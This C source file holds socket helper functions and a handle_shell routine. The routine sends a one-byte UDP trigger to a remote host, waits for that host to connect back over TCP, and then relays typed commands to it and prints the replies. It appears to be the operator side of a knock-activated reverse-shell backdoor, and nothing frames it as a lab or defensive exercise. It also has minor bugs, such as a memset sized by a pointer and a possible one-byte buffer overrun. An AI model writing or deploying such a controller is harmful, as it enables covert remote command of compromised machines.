#include "netlib.h"
#include "utils.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "bs_config.h"
#include <sys/time.h>
#include <pthread.h>

#define handle_error(msg) \
    perror(msg); \
    exit(EXIT_FAILURE)



void create_socket(int* sockfd, int domain, int type, int protocol)
{
    if((*sockfd = socket(domain, type, protocol)) < 0){
        handle_error("create_socket(int*, int, int, int): socket creation failed.");}
}

void create_udp_socket(int* sockfd)
{
    create_socket(sockfd, AF_INET, SOCK_DGRAM, 0);
    DBGLG("We got the sockfd: ", *sockfd);
}

void create_tcp_socket(int* sockfd)
{
    create_socket(sockfd, AF_INET, SOCK_STREAM, 0);
}

void bind_socket(int sockfd, struct sockaddr_in* addr)
{
    if (bind(sockfd, (struct sockaddr *)addr, sizeof(*addr)) < 0) 
    {
        handle_error("bind_socket(int, struct sockaddr*): bind failed.\n");
    }
}

void listen_on_socket(int sockfd, int backlog)
{
    if(sockfd < 0 || listen(sockfd, backlog) < 0){
        handle_error("listen_on_socket(int, int): listen failed.");}
}

void update_sockaddr_in(struct sockaddr_in *addr, int family, int port, const char* s_addr)
{
    if(addr == NULL){
        handle_error("update_sockaddr_in(struct sockaddr_in*, int, int, int): NULL pointer.");}
    memset(addr, 0, sizeof(addr));
    addr->sin_family = family;
    addr->sin_port = htons(port) ;
    if (s_addr == NULL){
        addr->sin_addr.s_addr = INADDR_ANY;
        return;
    }
    if (inet_pton(family, s_addr, &addr->sin_addr) <= 0) {
        handle_error("update_sockaddr_in(struct sockaddr_in*, int, int, int): Failed at creating sockaddr.");}
    
    
}

int send_udp(int socku, struct sockaddr_in* sa, char* data, int len)
{
    if (socku < 0 || sendto(socku, data, len, 0, (struct sockaddr*) sa, 16) < 0){
        DBGLG("send_udp(int, struct sockaddr_in, char*, int) failed to send udp packet");
        return -1;
    }
    return 0;
}

int get_port(struct sockaddr_in sa){
    return ntohs(sa.sin_port);
}

char* get_ip(struct sockaddr_in sa)
{
    return inet_ntoa(sa.sin_addr);
}

struct _nonblocking_accept_arg{
    int sockfd;
    struct sockaddr_in sa;
    int* client_fd;
} typedef _accept;

void nonblocking_accept(void* b){
    struct _nonblocking_accept_arg* a = (struct _nonblocking_accept_arg*)b;
    int sockfd_tc = a->sockfd;
    struct sockaddr_in sa = a->sa;
    int* client_fd = a->client_fd;;


    int junk = 16;
    if (((*client_fd = accept(sockfd_tc, (struct sockaddr*) &sa, &junk)) < 0)){
        perror("failed to accept tcp: ");
        return;
    }
    return;
}



int handle_shell(struct sockaddr_in sa, int sockfd_u, char shll){
    int ATTEMPTS = 3;

    int sockfd_tc;
    struct sockaddr_in tsa;
    int client_fd = -1;
    pthread_t tid;
    int response;
    char buf[2048];
    update_sockaddr_in(&tsa, AF_INET, TCP_PORT, NULL);
    create_tcp_socket(&sockfd_tc);
    bind_socket(sockfd_tc, &tsa);
    struct timeval timeout;
    timeout.tv_sec = 4;
    timeout.tv_usec = 0;
    if (setsockopt(sockfd_u, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
        perror("setsockopt");
        DBGLG("Could not set appropriate timeout\n");
        close(sockfd_tc);
        sleep(1);
        return -EXIT_FAILURE; 
    }
    if (setsockopt(sockfd_u, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
        perror("setsockopt");
        DBGLG("Could not set appropriate timeout\n");
        close(sockfd_tc);
        sleep(1);
        return -EXIT_FAILURE; 

    }
    listen_on_socket(sockfd_tc, 1);
_handle_shell_attempt:
    send_udp(sockfd_u, &sa, &shll, 1);
    DBGLG("We sent the welcome udp\n");
    // ////////////
    struct _nonblocking_accept_arg a = {sockfd_tc, sa, &client_fd};
    if(pthread_create(&tid, NULL,(void*) &nonblocking_accept, &a) != 0)
    {
        perror("Thread creation failed.");
        close(sockfd_tc);
        return -EXIT_FAILURE;
    }
    time_t t1 = time(NULL);
    while (client_fd < 0 && time(NULL) - t1 < 6){
        sleep(1);
    }
    if (client_fd < 0){
        
        DBGLG("Failed to accept\n");
        pthread_cancel(tid);
        pthread_join(tid, NULL);
        if (ATTEMPTS--){
            goto _handle_shell_attempt;
        }
        close(sockfd_tc);
        return -1;
    }
    pthread_join(tid, NULL);
    if (setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
        perror("setsockopt");
        DBGLG("Could not set appropriate timeout\n");
        
        close(client_fd);
        close(sockfd_tc);
        sleep(1);
        return -EXIT_FAILURE; 
 
    }
    sleep(1);
    DBGLG("Waiting for the responce\n");
    while ((response = recv(client_fd, buf, sizeof(buf), 0)) > 0) {
        // fd_set read_fds;
        // FD_ZERO(&read_fds);
        // FD_SET(client_fd, &read_fds);
        // struct timeval timeout1;
        // timeout.tv_sec = 1; // Timeout in seconds
        // timeout.tv_usec = 0;
        buf[response] = '\0';
        printf("%s", buf);
        fgets(buf, sizeof(buf), stdin);
        if (send(client_fd, buf, strlen(buf), 0) < 0){
            break;
        }
    }
    DBGLG("Exiting shell resp: ", response);
    perror("error: ");
    close(client_fd);
    close(sockfd_tc);
    return 0;
}